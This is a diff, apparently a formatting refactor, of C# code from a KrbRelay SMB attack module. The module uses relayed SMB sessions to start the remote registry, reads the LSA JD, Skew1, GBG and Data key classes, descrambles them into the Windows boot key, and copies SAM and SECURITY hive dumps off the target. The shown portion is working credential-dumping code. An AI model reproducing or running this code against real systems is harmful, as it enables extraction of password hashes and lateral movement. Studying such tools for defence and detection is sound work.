@@ -17,7 +17,14 @@ namespace KrbRelay.Clients.Attacks.Smb
                 Console.WriteLine("[-] Could not start remoteregistry");
                 return;
             }
-            using (RPCCallHelper rpc = new RPCCallHelper(smbClient, RrpService.ServicePipeName, RrpService.ServiceInterfaceGuid, RrpService.ServiceVersion))
+            using (
+                RPCCallHelper rpc = new RPCCallHelper(
+                    smbClient,
+                    RrpService.ServicePipeName,
+                    RrpService.ServiceInterfaceGuid,
+                    RrpService.ServiceVersion
+                )
+            )
             {
                 var status = rpc.BindPipe();
                 if (status != NTStatus.STATUS_SUCCESS)
@@ -43,20 +50,43 @@ namespace KrbRelay.Clients.Attacks.Smb
                 StringBuilder scrambledKey = new StringBuilder();
                 foreach (var key in new string[] { "JD", "Skew1", "GBG", "Data" }) //,
                 {
-                    var hBootKey = RrpServiceHelper.BaseRegOpenKey(rpc, hKey, $"SYSTEM\\CurrentControlSet\\Control\\Lsa\\{key}\x00", out status);
+                    var hBootKey = RrpServiceHelper.BaseRegOpenKey(
+                        rpc,
+                        hKey,
+                        $"SYSTEM\\CurrentControlSet\\Control\\Lsa\\{key}\x00",
+                        out status
+                    );
                     var v = RrpServiceHelper.baseRegQueryInfoKey(rpc, hBootKey, out status);
                     scrambledKey.Append(v.lpClassOut.Value);
                     RrpServiceHelper.BaseRegCloseKey(rpc, hBootKey, out status);
                 }
                 RrpServiceHelper.BaseRegCloseKey(rpc, hKey, out status);
-                byte[] scrambled = Helpers.StringToByteArray(scrambledKey.ToString());
-                byte[] transforms = new byte[] { 0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7 };
+                byte[] scrambled = Helpers.HexToByteArray(scrambledKey.ToString());
+                byte[] transforms = new byte[]
+                {
+                    0x8,
+                    0x5,
+                    0x4,
+                    0x2,
+                    0xb,
+                    0x9,
+                    0xd,
+                    0x3,
+                    0x0,
+                    0x6,
+                    0x1,
+                    0xc,
+                    0xe,
+                    0xa,
+                    0xf,
+                    0x7
+                };
                 byte[] bootKey = new byte[16];
                 for (int i = 0; i < 16; i++)
                 {
                     bootKey[i] = scrambled[transforms[i]];
                 }
-                Console.WriteLine("[*] Bootkey: {0}", Helpers.ByteArrayToString(bootKey));
+                Console.WriteLine("[*] Bootkey: {0}", Helpers.ByteArrayToHex(bootKey));
 
                 Shares.copyFile(smbClient, "windows\\temp\\sam.tmp", true, out byte[] bsam);
                 Shares.copyFile(smbClient, "windows\\temp\\sec.tmp", true, out byte[] bsec);
